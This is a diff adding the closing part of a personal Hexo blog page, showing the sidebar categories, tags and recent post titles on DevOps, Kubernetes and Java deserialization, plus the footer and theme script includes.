+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/DevOps/">DevOps</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/DevOps/Docker/">Docker</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/DevOps/Nginx/">Nginx</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/DevOps/Nginx/Docker/">Docker</a><span class="category-list-count">1</span></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/HTTP-Request-Smuggling/">HTTP Request Smuggling</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/HTTP-Request-Smuggling/Portswigger/">Portswigger</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java/">Java</a><span class="category-list-count">6</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Java/Deserialization/">Deserialization</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java/Programming/">Programming</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Mysql/">Mysql</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Mysql/SQLi/">SQLi</a><span class="category-list-count">1</span></li></ul></li></ul>
+  </aside>
+
+
+            
+                
+  <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
+    <h4 class="widget-title"><i class="fa fa-tags"></i>Những thẻ hiện có</h4>
+      <div class="tag-clouds">
+        <a href="/tags/Commons-Collections/" style="font-size: 0.72em;">Commons Collections</a> <a href="/tags/Deserialization/" style="font-size: 0.76em;">Deserialization</a> <a href="/tags/DevOps/" style="font-size: 0.64em;">DevOps</a> <a href="/tags/Docker/" style="font-size: 0.68em;">Docker</a> <a href="/tags/HRS/" style="font-size: 0.68em;">HRS</a> <a href="/tags/Java/" style="font-size: 0.8em;">Java</a> <a href="/tags/Mysql/" style="font-size: 0.6em;">Mysql</a> <a href="/tags/Nginx/" style="font-size: 0.6em;">Nginx</a> <a href="/tags/Portswigger/" style="font-size: 0.6em;">Portswigger</a> <a href="/tags/Programming/" style="font-size: 0.6em;">Programming</a> <a href="/tags/Reflection/" style="font-size: 0.6em;">Reflection</a> <a href="/tags/SQLi/" style="font-size: 0.6em;">SQLi</a>
+      </div>
+  </aside>
+
+            
+                
+  <aside id="krw-posts" class="widget widget-kratos-posts">
+  <h4 class="widget-title"><i class="fa fa-file"></i>Bài viết gần đây</h4>
+  <div class="tab-content">
+      <ul class="list-group">
+        
+        
+          
+          
+            <a class="list-group-item" href="/2023/12/10/writing-a-kubenetes-yaml/"><i class="fa  fa-book"></i> Học cách viết và hiểu một Kubernetes YAML files</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2023/07/17/gobuffalo-soda-cli/"><i class="fa  fa-book"></i> Gobuffalo Soda-cli</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2023/06/23/kubernetes-learning/"><i class="fa  fa-book"></i> Kubernetes learning</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2023/04/15/nginx-learning/"><i class="fa  fa-book"></i> Nginx Learning Journey</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2023/03/20/CommonsCollections3/"><i class="fa  fa-book"></i> Phân tích chuỗi Commons Collections 3</a>
+            
+          
+        
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+      </ul>
+  </div>
+  </aside>
+
+            
+    </div>
+</section>
+        
+        </div>
+    </div>
+</div>
+<footer>
+    <div id="footer" class="ap-lrc">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-md-offset-3 footer-list text-center">
+                    <ul class="kratos-social-icons">
+                        
+                        <li><a href="mailto:rayin.awarf@gmail.com" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-envelope"></i></a></li>
+                        <li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://t.me/rayinaw"><i class="fa fa-telegram"></i></a></li>
+                        
+                        
+                        
+                        
+                        <li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/rayinaw"><i class="fa fa-github"></i></a></li>
+                        
+                    </ul>
+                    <ul class="kratos-copyright">
+                        <div>
+                            <li>&copy; 2024 Rayinaw All rights reserved.</li>
+                            <li>This site has been running for<span id="span_dt">Loading...</span></li>
+                        </div>
+                        <div>
+                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank" rel="external nofollow noopener noreferrer">Kratos:Rebirth</a></li>
+                            <li>Site built with&nbsp;<i class="fa fa-heart throb" style="color:#d43f57"></i>&nbsp;by Rayinaw.</li>
+                        </div>
+                        <div>
+                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="external nofollow noopener noreferrer">Hexo</a></li>
+                            <li>Hosted on <a href="https://github.io" target="_blank" rel="external nofollow noopener noreferrer">Github Pages</a></li>
+                        </div>
+                        <div>
+                            
+                            
+                        </div>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="kr-tool text-center">
+            <div class="tool">
+                
+                    <div class="box search-box">
+                        <a href="/search/">
+                            <span class="fa fa-search"></span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="box theme-box" id="darkmode-switch">
+                        <span class="fa fa-adjust"></span>
+                    </div>
+                
+                
+            </div>
+            <div class="box gotop-box">
+                <span class="fa fa-chevron-up"></span>
+            </div>
+        </div>
+    </div>
+</footer>
+</div>
+</div>
+
+        <script defer src="/vendors/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
+<script defer src="/vendors/nprogress@0.2.0/nprogress.js"></script>
+<script>
+    if (!window.kr) {
+        window.kr = {};
+    }
+    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
+    window.kr.siteRoot = "/";
+</script>
+
+    <div>
+        <canvas id="snow"></canvas>
+        <script async src="/js/snow.min.js"></script>
+    </div>
+
+
+    <script async src="/js/candy.min.js"></script>
+
+
+
+    <script defer src="/vendors/aplayer@1.10.1/dist/APlayer.min.js"></script>
+    
+    <script defer src="/vendors/meting@2.0.1/dist/Meting.min.js"></script>
+    <meting-js server="netease" type="playlist" id="3204190542" order="random" fixed="true">
+    </meting-js>
+
+
+
+    <script defer src="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+<script defer src="/vendors/clipboard@2.0.6/dist/clipboard.min.js"></script>
+<script defer src="/js/kratosr.min.js"></script>
+<script defer src="/js/pjax.min.js"></script>
+
+
+
+<!-- Extra support for third-party plguins  -->
+
+
+    </body>
+</html>
